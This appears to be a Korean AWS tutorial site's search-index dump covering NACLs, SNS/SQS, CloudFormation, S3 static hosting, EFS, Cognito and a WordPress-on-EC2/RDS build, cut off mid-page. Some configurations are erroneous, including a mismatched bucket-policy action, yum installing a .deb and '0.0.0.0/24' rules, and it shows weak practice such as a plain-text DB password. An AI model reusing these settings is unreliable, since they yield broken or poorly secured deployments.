Network ACL  Security Group은 ‘Stateful’, Network ACL은 ‘Stateless’ Stateful: Inbound Rule과 Outbound Rule 중 하나가 적용되면 다른 하나는 정용되지 않음 Stateless: Inbound Rule과 Outbound Rule 모두 적용 Secuity Group은 허용만 가능, Network ACL은 허용 및 거부 가능 Security Group은 규칙 리스트에 있는 것 중 적용, Network ACL은 우선위에 따라 우선 규칙 적용 Security Group은 인스턴스의 가상 방화벽, Network ACL은 서브넷의 가상 방화벽  Simple Notification Service ( SNS )  구독중인 엔드포인트 혹은 사용자에게 메시지를 보내는 서비스 주제 ( Topic )와 구독 ( Subscription )으로 나뉨 하나의 주제에 다수의 구독자로 이루어질 수 있음 주제는 다음과 같은 요소를 설정  메시지를 게시할 수 있는 대상과 받을 수 있는 대상 암호화 여부 메시지 전송 정책   구독은 메시지를 받을 대상을 설정  HTTP ( 웹 ) SQS email Lambada ( 메시지를 전송하여 Lambda 호출 가능 ) 모바일 애플리케이션   푸시 기반 서비스   Simple Queue Service ( SQS )  AWS 최초의 서비스 2004년 런칭 시작 서버와 서버 혹은 서버와 엔드포인트 통신 중 장애시 모든 요청을 잃어버릴 수 있는 사태를 대비할 수 있음 서버 1이 서버 2로 요청을 보내는 경우, 서버2에 직접 보내지 않고 큐( SQS )에 담아두면, 서버2가 우체통 열 듯 큐( SQS )를 열어 메시지를 확인하고 수행 수행한 메시지는 서버2가 확인 후 삭제 각 메시지는 최대 256KB의 텍스트로 구성될 수 있음 최대 14일까지 저장 가능하나, 기본값은 4일 처리되지 않은 서비스는 다시 큐에 보존되며 다른 요청자가 열함할 수 있음 즉, 서비스 요청을 저장하고 대기열을 만들어 처리할 수 있도록 하는 서비스 Standard 대기열과 FIFO 대기열로 나뉨  Standard 대기열: 표준 서비스로 초당 무제한에 가까운 요청을 처리할 수 있으며 최소 한 번의 요청을 처리하나 순서가 보장되지 않음 FIFO 대기열: 선입선출을 지키는 대기열, 초당 300개까지 가능     SQS vs SNS  SNS는 Push 기반 서비스이나 SQS는 Pull 기반 서비스 즉 SNS는 와서 전달하고, SQS는 가서 찾아와야ㅑ 함  "});index.add({'id':121,'href':'/docs/cloudcomputing/awstraining/cloudformation/','title':"AWS CloudFormation",'content':"AWS CloudFormation    이번 장에서는 CloudFormation의 탬플릿을 사용하여 서버를 자동 구축되도록 생성해보도록 하겠습니다. CloudFormation의 대한 개념은 CloudFormation을 참고하세요.    CloudFormation을 활용한 자동구축     CloudFormation 아키텍처 예시     먼저, AWS에서 CloudFormation 검색 후 클릭합니다.      스택 생성을 클릭합니다.       스택 생성을 위해 아래의 값을 cloudformation_instance.template 을 생성하여 업로드 합니다. 보통 Templates 파일은 S3에 저장된 것을 사용하지만, 여기서는 로컬환경에서 가져와 사용해보도록 하겠습니다. CloudFormation Templates 참조   {\r\u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;2010-09-09\u0026#34;,\r\u0026#34;Resources\u0026#34;: {\r\u0026#34;Instance\u0026#34;: {\r\u0026#34;Type\u0026#34;: \u0026#34;AWS::EC2::Instance\u0026#34;,\r\u0026#34;Properties\u0026#34;:{\r\u0026#34;Monitoring\u0026#34;: \u0026#34;false\u0026#34;,\r\u0026#34;ImageId\u0026#34;: \u0026#34;[ AMI ID ]\u0026#34;,\r\u0026#34;KeyName\u0026#34;: \u0026#34;[ Key ]\u0026#34;,\r\u0026#34;InstanceType\u0026#34;: \u0026#34;t2.micro\u0026#34;,\r\u0026#34;NetworkInterfaces\u0026#34;: [ {\r\u0026#34;DeviceIndex\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;AssociatePublicIpAddress\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;DeleteOnTermination\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;SubnetId\u0026#34;: \u0026#34;[ 서브넷 ID ]\u0026#34;,\r\u0026#34;GroupSet\u0026#34;: [\u0026#34;[ 보안 그룹 ]\u0026#34;]\r}\r]\r}\r} },\r\u0026#34;Description\u0026#34;: \u0026#34;SampleInstance\u0026#34;\r}\r  CloudFormation 기본형식  {\r\u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;version date\u0026#34;,\r\u0026#34;Description\u0026#34; : \u0026#34;JSON string\u0026#34;,\r\u0026#34;Parameters\u0026#34;: {\rset of parameters\r},\r\u0026#34;Mappings\u0026#34;: {\rset of mappings\r},\r\u0026#34;Conditions\u0026#34;: {\rset of conditions\r},\r\u0026#34;Resources\u0026#34;: {\rset of resources\r},\r\u0026#34;Outputs\u0026#34;: {\rset of outpus\r}\r}\r    옵션 설명     AWSTemplateFormatVersion 템플릿의 버전   Description 템플릿의 대한 설명 ( 시스템이 읽지 않음 )   Parameters 스택 생성 때에 전달할 값, 탬플릿 내부에서 Ref 함수로 참조   Mappings 해시 테이블처럼 키에 따라 값을 지정할 수 있으며, 리전마다 사용할 AMI를 다르게 하는 경우 등의 사용   Conditions 조건을 판단, 조건에 일치하는 경우 실행할 리소스를 지정할 수 있음   Resources 생성할 자원을 정의, EC2 인스턴스, 보안 그룹 등의 생성할 자원 유형을 지정하고 설정 ( 아직 모든 서비스를 이용할 수는 없음 )   Outputs 탬플릿으로 생성한 결과를 출력         업로드가 완료되면, 스택의 이름을 지정합니다.      스택 옵션 구성에서는 IAM 역할, 그 외에도 스택의 정책과 옵션들을 구성할 수 있습니다. 여기에서는 기본 값으로 진행하겠습니다.      스택의 생성이 완료되면, 그림과 같이 상태에서 로그를 확인하실 수 있습니다. 생성이 완료되면 인스턴스가 생성된 것을 확인 할 수 있습니다.     CloudFormation 업데이트    이번에는 생성된 Stack을 업데이트 하는 방법에 대해 알아보도록 하겠습니다.    먼저, 위에서 생성한 Stack \u0026gt; 업데이트를 클릭합니다.      스택 업데이트를 클릭하면 현재 템플릿을 사용하면서 스택의 옵션만 바꿀건지, 혹은 탬플릿 자체를 변경할 것인지에 대한 옵션이 나옵니다. 저희는 탬플릿 자체에 대한 옵션을 바꾸기 위해 기존 templates 파일을 아래와 같이 수정하여 업데이트 하도록 하겠습니다. Designer 편집기에서 추가하셔도 상관은 없습니다.  {\r\u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;2010-09-09\u0026#34;,\r\u0026#34;Resources\u0026#34;: {\r\u0026#34;Instance\u0026#34;: {\r\u0026#34;Type\u0026#34;: \u0026#34;AWS::EC2::Instance\u0026#34;,\r\u0026#34;Properties\u0026#34;:{\r\u0026#34;Monitoring\u0026#34;: \u0026#34;false\u0026#34;,\r\u0026#34;ImageId\u0026#34;: \u0026#34;ami-01af223aa7f274198\u0026#34;,\r\u0026#34;KeyName\u0026#34;: \u0026#34;Study\u0026#34;,\r\u0026#34;InstanceType\u0026#34;: \u0026#34;t2.micro\u0026#34;,\r\u0026#34;NetworkInterfaces\u0026#34;: [ {\r\u0026#34;DeviceIndex\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;AssociatePublicIpAddress\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;DeleteOnTermination\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;SubnetId\u0026#34;: \u0026#34;subnet-463b3d0a\u0026#34;,\r\u0026#34;GroupSet\u0026#34;: [\u0026#34;sg-f553af91\u0026#34;]\r}\r],\r\u0026#34;UserData\u0026#34;: { \u0026#34;Fn::Base64\u0026#34; :\r{ \u0026#34;Fn::Join\u0026#34; : [\u0026#34;\u0026#34;, [\r\u0026#34;#!/bin/bash\\n\u0026#34;,\r\u0026#34;yum update -y\\n\u0026#34;,\r\u0026#34;yum install -y httpd\\n\u0026#34;,\r\u0026#34;service httpd start\\n\u0026#34;,\r\u0026#34;chkconfig httpd on\\n\u0026#34; ]]\r}\r}\r}\r} },\r\u0026#34;Description\u0026#34;: \u0026#34;SampleInstance\u0026#34;\r}\r    탬플릿 업로드 후, 위와 동일하게 생성하면 보기와 같이 업데이트를 확인하실 수 있습니다.      생성된 인스턴스로 접속하면, Apache가 설치되어 있는 것을 확인하실 수 있습니다.     CloudForamtion 파라미터 설정    위에서는 고정 값으로 스택을 생성했지만, 만약 고정 값으로 생성을 진행할 경우, 에러가 발생할 수 있으며, 여러 탬플릿을 생성해야하는 번거로움이 존재합니다. 이번에는 파라미터 값을 설정하여 CloudFormation을 사용하는 방법에 대해 알아보도록 하겠습니다.    먼저 위에서 생성한 템플릿을 Parameter 값을 사용하도록 수정하여 보겠습니다.  {\r\u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;2010-09-09\u0026#34;,\r\u0026#34;Parameters\u0026#34;: {\r\u0026#34;ImageId\u0026#34; : {\r\u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;,\r\u0026#34;Default\u0026#34;: \u0026#34;ami-01af223aa7f274198\u0026#34;,\r\u0026#34;Description\u0026#34;: \u0026#34;IamgeId\u0026#34;\r},\r\u0026#34;KeyName\u0026#34; : {\r\u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;,\r\u0026#34;Default\u0026#34;: \u0026#34;Study\u0026#34;,\r\u0026#34;Description\u0026#34;: \u0026#34;Keypair name\u0026#34;\r},\r\u0026#34;InstanceType\u0026#34; : {\r\u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;,\r\u0026#34;Default\u0026#34;: \u0026#34;t2.micro\u0026#34;,\r\u0026#34;Description\u0026#34;: \u0026#34;InstanceType\u0026#34;\r},\r\u0026#34;AssociatePublicIpAddress\u0026#34; : {\r\u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;,\r\u0026#34;Default\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;Description\u0026#34;: \u0026#34;PublicIP\u0026#34;,\r\u0026#34;AllowedValues\u0026#34;: [\u0026#34;true\u0026#34;, \u0026#34;false\u0026#34;]\r},\r\u0026#34;DeleteOnTermination\u0026#34; : {\r\u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;,\r\u0026#34;Default\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;Description\u0026#34;: \u0026#34;DeleteOnTermination\u0026#34;,\r\u0026#34;AllowedValues\u0026#34;: [\u0026#34;true\u0026#34;, \u0026#34;false\u0026#34;]\r},\r\u0026#34;SubnetId\u0026#34; : {\r\u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;,\r\u0026#34;Default\u0026#34;: \u0026#34;subnet-463b3d0a\u0026#34;,\r\u0026#34;Description\u0026#34;: \u0026#34;SubnetId\u0026#34;\r},\r\u0026#34;GroupSet\u0026#34; : {\r\u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;,\r\u0026#34;Default\u0026#34;: \u0026#34;sg-f553af91\u0026#34;,\r\u0026#34;Description\u0026#34;: \u0026#34;GroupSet\u0026#34;\r}\r},\r\u0026#34;Resources\u0026#34;: {\r\u0026#34;Instance\u0026#34;: {\r\u0026#34;Type\u0026#34;: \u0026#34;AWS::EC2::Instance\u0026#34;,\r\u0026#34;Properties\u0026#34;:{\r\u0026#34;Monitoring\u0026#34;: \u0026#34;false\u0026#34;,\r\u0026#34;ImageId\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;ImageId\u0026#34; },\r\u0026#34;KeyName\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;KeyName\u0026#34; },\r\u0026#34;InstanceType\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;InstanceType\u0026#34; },\r\u0026#34;NetworkInterfaces\u0026#34;: [ {\r\u0026#34;DeviceIndex\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;AssociatePublicIpAddress\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;AssociatePublicIpAddress\u0026#34; },\r\u0026#34;DeleteOnTermination\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;DeleteOnTermination\u0026#34; },\r\u0026#34;SubnetId\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;SubnetId\u0026#34; },\r\u0026#34;GroupSet\u0026#34;: [{ \u0026#34;Ref\u0026#34; : \u0026#34;GroupSet\u0026#34; }],\r}\r],\r\u0026#34;UserData\u0026#34;: { \u0026#34;Fn::Base64\u0026#34; :\r{ \u0026#34;Fn::Join\u0026#34; : [\u0026#34;\u0026#34;, [\r\u0026#34;#!/bin/bash\\n\u0026#34;,\r\u0026#34;yum update -y\\n\u0026#34;,\r\u0026#34;yum install -y httpd\\n\u0026#34;,\r\u0026#34;service httpd start\\n\u0026#34;,\r\u0026#34;chkconfig httpd on\\n\u0026#34; ]]\r}\r}\r}\r} },\r\u0026#34;Description\u0026#34;: \u0026#34;SampleInstance\u0026#34;\r}\r 특정 리소스 값들은 파라미터 값에서 가져오는 방식으로 수정하였습니다. 위와 같이 설정을 마친 후, 동일하게 스택의 생성을 진행해봅니다.      템플릿을 업로드 후 동일하게 진행합니다.      하지만 전과는 다르게 수정한 파라미터 값들을 선택하거나 기입하는 선택란이 추가되었습니다. 기본적으로 Default 값들을 출력하며, AllowedValues 값이 존재할 시 그 값들만을 선택가능합니다.      생성이 완료되었습니다. 이와 같이 파라미터 값을 사용하면 보다 편리하게 서비스들의 구현이 가능합니다.     예제 1. 다음의 탬플릿을 생성해보세요.  VPC를 생성하고, 3개의 서브넷이 모두 인터넷 게이트웨이로 연결되게 생성하는 템플릿을 생성하세요.   예제 2. 다음의 탬플릿을 생성해보세요.  웨어 생성한 VPC의 서브넷을 선택해 생성이 가능하도록 인스턴스를 만들고, userdata를 통해 인스턴스의 8080으로 바로 접속이 가능하게 tomcat을 설치해주세요.  "});index.add({'id':122,'href':'/docs/cloudcomputing/awstraining/noserver/','title':"AWS 서버리스 사이트 구축",'content':"AWS 서버리스 사이트 구축    이번 장에서는 S3를 통해 서버가 없는 정적인 사이트를 구현해보도록 하겠습니다. 이와 같이 서버리스의 가장 큰 특징은 EC2처럼 상시 실행 상태 중이 아니여도, 사용자가 요청시에만 실행이 가능하기 때문에 비용면과 운영면에서 효율적이라 할 수 있습니다. AWS에서는 S3에서 웹 호스팅 기능을 제공하고 있어, 이를 통해 구현해보도록 하겠습니다.    AWS 서버리스 사이트 구축      먼저, AWS에 접속하여 S3 서비스를 검색 후, 클릭합니다.      S3를 시작하기 위해 버킷을 생성합니다.      버킷의 이름을 지정하고, 리전을 선택합니다.      기본 값으로 설정을 진행합니다.      단, 그림과 같이 퍼블릭 엑세스의 대한 차단을 해제합니다.      버킷의 생성이 완료되었습니다.      다음으로는 생성된 버킷을 호스팅 등록하기 전에, 버킷의 정책을 먼저 생성하겠습니다. 버킷의 생성이 완료되면, 생성된 버킷을 클릭합니다. 생성된 버킷에서 권한 -\u0026gt; 버킷 정책을 클릭 후, 하단의 정책 생성기를 클릭합니다.      그림은 정책생성기로, 원하는 정책옵션을 선택하면 그 옵션을 Json파일로 변환시켜주는 역할을 수행합니다. 여기서는 아래의 값으로 설정을 진행합니다.   Select Type : S3 Bucket Policy\nPrincipal : \u0026quot; * \u0026ldquo; ( Principal는 리소스로의 접근을 허가 또는 거부할 사용자, 계정, 서비스, 엔티티를 나타냅니다.) Actions : GetObject ( Actions는 허가할 조작을 나타냅니다.)\nARN : arn:aws:s3::: [ 버킷 이름 ]/[ Key_name ] ( 허용할 파일 혹은 디렉토리를 나타냅니다. 여기서 /Key_name은 /*을 사용합니다. )\n     생성 후, Add Statement를 클릭하면 현재 선택한 옵션들은 Json 형식으로 바꾸어 줍니다.  {\r\u0026#34;Id\u0026#34;: \u0026#34;Policy1593408879908\u0026#34;,\r\u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;,\r\u0026#34;Statement\u0026#34;: [\r{\r\u0026#34;Sid\u0026#34;: \u0026#34;Stmt1593408870453\u0026#34;,\r\u0026#34;Action\u0026#34;: [\r\u0026#34;s3:GetBucketObjectLockConfiguration\u0026#34;\r],\r\u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;,\r\u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::s3-serverless-web/*\u0026#34;,\r\u0026#34;Principal\u0026#34;: \u0026#34;*\u0026#34;\r}\r]\r}\r    다음은 미리 index.html과 error.html 파일을 업로드 하겠습니다.      위의 그림과 같이 파일을 업로드 합니다. 모든 설정은 기본 값으로 설정합니다.      이제, 호스팅을 위해 S3에서 정적 웹 사이트 호스팅을 설정하겠습니다. S3의 속성 -\u0026gt; 정적 웹 사이트 호스팅을 선택합니다.      정적 웹 사이트 호스팅 창이 나오면 인덱스 문서 및 오류 문서의 업로드한 파일을 기입 후 저장합니다.      이제 S3 EndPoint로 접속하면 index.html을 확인할 수 있습니다. 또한 에러 발생시에는 error.html이 보여지는 것을 확인할 수 있습니다.    이제 이것으로 기본적인 S3를 사용한 정적사이트 구축이 완료되었습니다. 이어서 서비스와 기능을 추가시켜보도록 하겠습니다.     AWS 서버리스 사이트 세부설정   Redirection Rules   Redirection Rules란 특정 경로 또는 HTTP 오류 코드 등의 조건에 따라 라우팅을 지정해주는 기능입니다.     \u0026lt;RoutingRules\u0026gt;\r\u0026lt;RoutingRule\u0026gt;\r\u0026lt;Condition\u0026gt;\r\u0026lt;KeyPrefixEquals\u0026gt;hello/\u0026lt;/KeyPrefixEquals\u0026gt;\r\u0026lt;/Condition\u0026gt;\r\u0026lt;Redirect\u0026gt;\r\u0026lt;ReplaceKeyPrefixWith\u0026gt;bye/\u0026lt;/ReplaceKeyPrefixWith\u0026gt;\r\u0026lt;/Redirect\u0026gt;\r\u0026lt;/RoutingRule\u0026gt;\r\u0026lt;/RoutingRules\u0026gt;\r# KeyPrefixEquals로 진입한 트래픽을 ReplaceKeyPrefixWith로 진입시킵니다.\r Redirection Rules의 설정을 위해 다시 정적 웹 사이트 호스팅 설정을 클릭합니다. 후 위의 값을 리디렉션 규칙에 작성합니다. 위 설정을 마치면 Endpoint에 hello로 진입시 bye로 진입되는 것을 확인 할 수 있습니다.     \u0026lt;RoutingRules\u0026gt;\r\u0026lt;RoutingRule\u0026gt;\r\u0026lt;Condition\u0026gt;\r\u0026lt;HttpErrorCodeReturnedEquals\u0026gt;404\u0026lt;/HttpErrorCodeReturnedEquals\u0026gt;\r\u0026lt;/Condition\u0026gt;\r\u0026lt;Redirect\u0026gt;\r\u0026lt;ReplaceKeyWith\u0026gt;index.html\u0026lt;/ReplaceKeyWith\u0026gt;\r\u0026lt;/Redirect\u0026gt;\r\u0026lt;/RoutingRule\u0026gt;\r\u0026lt;/RoutingRules\u0026gt;\r# HttpErrorCodeReturnedEquals는 특정 에러가 발생하면 에러를 보여주는 대신 ReplaceKeyWith 값을 보여줍니다.\r 이와 동일하게 위의 값을 다시 리디렉션 규칙에 작성합니다. 설정을 마치면, Endpoint/의 모든 Null 값이 index.html로 옮겨지는 것을 확인할 수 있습니다.      차후 Lmabda, DNS, CDN 서비스를 추가하여 업데이트 하겠습니다.  DNS 설정                                              "});index.add({'id':123,'href':'/docs/cloudcomputing/awstraining/ebs/','title':"정리 중",'content':"AWS Elastic Fire System    EFS      AWS 서비스에서 EFS를 클릭합니다.      스토리지 생성을 위해 파일 시스템 생성을 클릭합니다.      네트워크 엑세스를 구성합니다. 여기서는 기본 VPC에서 가용영역 a, c를 사용하겠습니다.      파일 시스템 설정 구성을 설정합니다. 여기서는 후에 설정을 전부 기본 값을 사용하여 생성합니다.      생성된 내용을 확인합니다.      EFS 사용하기 위해 가용영역 a, c에 인스턴스를 생성합니다.     $ yum install make git binutils\r$ git clone https://github.com/aws/efs-utils\r$ cd efs-utils\r$ ./build-deb.sh\r$ cd build\r$ yum install -y ./amazon-efs-utils-1.5-1.deb\r$ yum install -y install nfs-common\r 패키지들을 설치합니다.                          "});index.add({'id':124,'href':'/docs/cloudcomputing/awstraining/cognito/','title':"AWS Cognito",'content':"AWS Cognito    AWS Cognito      Cognito는 기본적으로 모바일에서 인증을 진행 후, 인증 혹은 비인증에 해당하는 리소스에 대한 사용 권한을 부여 받는 형식으로 진행됩니다.      Cognito 서비스 사용을 위해서 먼저, AWS에 접속하여 Cognito를 검색합니다. Cognito에 대한 개념은 Cognito를 참고하세요.      Cognito의 메인 페이지에서 \u0026gt; 자격 증명 풀 관리를 클릭합니다.      새 자격 증명 풀을 생성합니다. 인증되지 않은 자격 증명은 비인증 사용자에 대한 엑세스 권한을 설정하는 옵션입니다. 인증 공급자는 사용자의 인증을 확인해 OpenID Connect 기반의 프로바이저입니다.      생성이 완료되면 새로운 IAM 권한을 생성하고 허용합니다.      이제 다시 풀 관리로 진입하면, 생성된 풀의 확인이 가능합니다. 생성한 풀을 선택하여 해당 풀에 진입합니다.      풀에 대한 자격증명을 편집합니다.     AWS Mobile SDK   이제 다음으로 AWS Mobile SDK에 대한 사용방법을 알아보도록 하겠습니다. AWS Moblie SDK 참조 핸드폰의 기종에 맞춰 안드로이드 스튜디오 혹은 Xcode를을 준비해주세요. 여기서는 Vmware의 Mac환경을 설치하여 진행하도록 하겠습니다. VMware Mac 환경설치   $ sudo gem install bundler\r$ sudo gem install cocoapods\r$ pod setup\r# CocoaPods 라이브러리를 설치합니다.\r$ git clone https://github.com/awslabs/aws-sdk-ios-samples.git\r$ Samples 코드를 다운 받습니다.\r$ cd [ 다운로드 경로 ]/S3TransferManager-Sample/Objective-C\r$ cat Podfile\r# 해당 디렉토리로 이동하여 Podfile을 확인합니다. Podfile은 프로젝트에 필요한 라이브러리를 작성하는 파일입니다.\r$ pod install\r# Podfile의 작성되어 있는 라이브러리들을 설치합니다.\r AWS Mobile SDK을 사용하기 위한 환경을 구현합니다.      설치가 완료되면 Xcode를 실행합니다. 단, .xcodeproj가 아닌 .xcworkspace파일을 실행해야 합니다.     #import \u0026lt;Foundation/Foundation.h\u0026gt;\rNSString *const AWSAccountID = @\u0026#34;Your-AccountID\u0026#34;;\rNSString *const CognitoPoolID = @\u0026#34;Your-PoolID\u0026#34;;\rNSString *const CognitoRoleUnauthID = @\u0026#34;Your-RoleUnauthID\u0026#34;;\rNSString *const CognitoRoleAuth = @\u0026#34;Your-RoleID\u0026#34;;\rNSString *const S3BucketName = @\u0026#34;Your-S3-Bucket-Name\u0026#34;;\r Constant.m 파일을 편집합니다.                  예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r "});index.add({'id':125,'href':'/docs/cloudcomputing/awstraining/ec2site/','title':"EC2 동적 사이트 구축",'content':"EC2 동적 사이트 구축    이번 장에서는 EC2와 WordPress, RDS를 활용해 동적 사이트를 구축해보겠습니다. 이 장에서는 RDS 복제본 사용시 과금이 청구될 수 있습니다. 이를 원치 않는 분들은, RDS 설정 시, Multi-AZ 설정을 하지 않고, 1개의 Master RDS만 생성 후 진행하세요.\r\r    EC2 동적 사이트 구축       VPC     VPC 이름 IPv4 CIDR     VPC-WordPress 10.0.0.0/16      Subnet     Subnet 이름 VPC AZ IPv4 CIDR     WordPress-Public-Subnet VPC-WordPress ap-northeast-a 10.0.1.0/24   WordPress-Public-Subnet2 VPC-WordPress ap-northeast-c 10.0.2.0/24   RDS-Private-Subnet VPC-WordPress ap-northeast-a 10.0.11.0/24   RDS-Private-Subnet2 VPC-WordPress ap-northeast-c 10.0.12.0/24      Routing Table     Routing Table 이름 VPC Subnet     Public-rt VPC-WordPress WordPress-Public-Subnet, WordPress-Public-Subnet2   Private-rt VPC-WordPress RDS-Private-Subnet, RDS-Private-Subnet2      보안 그룹     보안 그룹 이름 VPC 인 바운드 규칙 아웃 바운드 규칙      WordPress-sg VPC-WordPress SSH : 22/TCP : 0.0.0.0/24, HTTP : 80/TCP : 0.0.0.0/24 모든 트래픽 : 0.0.0.0/0    RDS-sg VPC-WordPress WordPress-sg, 3306/TCP : WordPress-sg 모든 트래픽 : 0.0.0.0/0       먼저 위의 아키텍처와 표와 같이 VPC와 서브넷을 생성해주세요. 인터넷 게이트 생성 후, VPC에 연결하세요. 모든 라우팅 테이블의 게이트웨이는 인터넷 게이트웨이로 지정해주세요. VPC 사용자 정의 VPC 생성     EC2를 활용한 동적 사이트 구축    기본적인 설정을 끝마치셨다면, 이제 동적 사이트 아래의 순서에 맞춰 구현해보겠습니다.   1. RDS 생성\n2. 인스턴스 생성\n3. ELB 생성\n    1. RDS 생성   먼저 RDS 서브넷의 생성을 위해, RDS \u0026gt; 서브넷 그룹 \u0026gt; DB 서브넷 그룹을 위와 동일하게 생성합니다.      아래의 형식에 맞춰 RDS를 생성합니다. RDS 설치 참고    기본설정     설정 항목 값     License Model genral-publicl-license   DB Engine Version 5.7.28   DB Instance Class db.t2.micro   Multi-AZ Deployment General Purpose ( SSD )   Allocated Storage 20 GB   DB 인스턴스 식별자 WordPressDB   마스터 사용자 ID, PW root/qwer1234      네트워크 설정     설정항목 값     VPC VPC-WordPress   Subnet Group rds-private   Publicly Accessible no   AZ ap-northeast-2a   VPC Security Groups RDS-sg      백업 설정     설정항목 값     백업 보존 기간 1일   백업 기간 기본 설정 없음      유지 관리설정     설정항목 값     마이너 버전 자동 업그레이드 사용   유지 관리 기간 기본 설정 없음   삭제 방지 삭제 방지 활성화 X      개인 설정 및 이 이외 값을 기본 값을 유지합니다.    2. 인스턴스 생성   다음의 값으로 인스턴스를 생성합니다.      설정 항목 값     AMI Amazon Linux AMI   Instance Type t2.micro   Network VPC-WordPress   Subnet WordPress-Public   Auto-asstign Public Enable   Name WordPress-a   Security Group Wordpress-sg         생성이 완료되면 아래의 미들웨어들을 설치합니다. 유저 이름은 ec2-user입니다.  $ sudo yum install -y php php-mysql php-gd php-mbstring\r# 관련 미들웨어를 설치합니다.\r$ sudo yum install -y mysql\r# mysql을 설치합니다.\r$ wget -O /tmp/wordpress-4.1-ja.tar.gz https://ko.wordpress.org/wordpress-4.6.1-ko_KR.tar.gz\r# wordpress-4.6.1...의 파일을 wordpress-4.1-ja.tar.gz의 이름으로 다운받습니다.\r$ sudo tar zxf /tmp/wordpress-4.1-ja.tar.gz -C /opt\r# wordpress 압축파일을 /opt에 압축을 해제합니다.\r$ sudo ln -s /opt/wordpress /var/www/html\r# 심볼릭 링크를 생성합니다.\r$ sudo chown -R apache:apache /opt/wordpress\r# wordpress의 소유 권한을 apache로 수정합니다.\r$ sudo chkconfig httpd on\r# httpd가 정상적으로 작동하는 지 체크합니다.\r$ sudo service httpd start\r$ httpd 서비스를 시작합니다.\r    설치가 완료되면 DB 접속을 위한 계정을 생성합니다.  $ mysql -u root -p -h [ RDS Endpoint ]\r$ password : qwer1234\rmysql\u0026gt; create user \u0026#39;wordpress-user\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;wordpress\u0026#39;;\rmysql\u0026gt; create database wordpress;\rmysql\u0026gt; grant all privileges on wordpress.* to \u0026#34;wordpress-user\u0026#34;@\u0026#34;%\u0026#34;;\rmysql\u0026gt; flush privileges;\r    계정 생성이 완료되었으면, http://인스턴스의 Public IP/wordpress/wp-admin/install.php로 접속합니다.      데이터베이스, 사용자명, 비밀번호에 위에서 생성한 값들을 입력 후, 데이터베이스의 호스트에는 RDS의 엔드포인트 값을 입력합니다.      설치를 실행합니다.      사이트의 제목과 관리자명 등을 설정합니다.      설정이 완료되면, 설정한 계정을 통해 로그인합니다.      Wored Press의 설치가 완료되었습니다.      생성이 완료되면 AMI 이미지를 생성합니다. AMI 이미지를 통해 동일한 인스턴스를 다른 가용영역에 생성합니다.     3. ELB 생성   80/tcp 외부로 ALB를 생성해주세요. ELB 생성 참고      ELB의 DNS로의 접속이 확인되면, 대상그룹 또한 확인합니다.      다음으로는 WordPress의 접속 IP를 변경해보겠습니다. WordPress의 관리자로 접속하여 설정 -\u0026gt; 워드프레스 주소, 사이트 주소를 변경합니다. 워드프레스 주소 : http://[ ALB DNS ]/wordpress 사이트 주소 : http://[ ALB DNS ] ALB에서 Desciption -\u0026gt; Edit stickiness에서 로드밸런서의 쿠키 값을 사용하도록 설정 후, 시간은 1800초로 설정합니다.      이제 마지막으로 WordPress-sg의 80/tcp 포트의 대상을 0.0.0.0/0이 아닌, ALB를 대상으로 설정 및, SSH 접속을 해제하면 모든 설정이 완료됩니다.     Marketplace를 사용   위 처럼 직접 구현하는 방법 외에도 이미 구현되어 있는 AMI를 구입하여 사용하는 방법도있습니다.    위 그림과 같이 Markplace에서 구입이 가능합니다. Marketplace로 구현을 할 경우, 이미 구축되어진 인프라를 사용하는 만큼, 간편하고 빠르게 사용할 수 있지만, 세부적인 사항에 대해서는 설정이 어렵다는 단점이 있습니다.  "});index.add({'id':126,'href':'/docs/cloudcomputing/awstraining/elasticbeanstalk/','title':"Elastic Beanstalk 사이트 구축",'content':"Elastic Beanstalk 사이트 구축    이번 장에서는 Elastic Beanstalk를 활용해서 WordPress 사이트를 구축해보겠습니다. Elastic Beanstalk가 무엇인지는 Elastic Beanstalk를 참조해주세요.    Elastic Beanstalk 사이트 구축      Elastic Beanstalk는 zip 형식으로 애플리케이션을 압축해서 AWS 상에 업로드 할 수 있습니다. WordPress를 사용하기 위해 WordPress에서 zip 형식으로 다운로드 합니다.      다운로드가 완료되면 AWS에서 Elastic Beanstalk를 검색합니다.      Elastic Beanstalk의 생성을 위해 Create Application을 클릭합니다.      애플리케이션의 이름과 태그를 설정합니다.      플랫폼에서는 사용할 플랫폼을 설정할 수 있습니다. 여기서는 PHP를 선택합니다.      애플리케이션 코드에서는 코드 업로드를 클릭합니다. 소스 코드는 위에어 다운로드 한 WordPress.zip 파일을 업로드 합니다. 업로드가 완료되면 추가 옵션 구성을 클릭하여 세부설정으로 진입합니다.      ElasticBeanstalk의 구성을 위해 사용자 지정을 클릭 후 아래항목으로 이동합니다.      먼저 최하단으로 진입하여 데이터베이스 